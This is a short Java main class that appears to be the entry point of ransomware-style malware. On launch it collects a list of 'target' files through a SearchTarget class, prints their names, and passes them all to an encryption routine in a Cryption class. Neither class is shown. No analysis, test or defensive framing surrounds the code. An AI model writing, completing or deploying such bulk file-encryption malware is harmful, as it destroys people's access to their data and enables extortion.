package main;

import cipher.Cryption;
import finder.SearchTarget;
import javafx.application.Application;
import javafx.stage.Stage;

import javax.swing.*;

public class Execute extends Application {

  public static void main(String... halloween) {
    new JFrame().setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    launch(halloween);
  }

  @Override
  public void start(Stage primaryStage) throws Exception {
    SearchTarget searchTarget = new SearchTarget();
    searchTarget.getTargetList()
        .forEach(file -> System.out.println(file.getName()));

    Cryption cryption = new Cryption();
    cryption.exeEncrypt(searchTarget.getTargetList());
  }
}
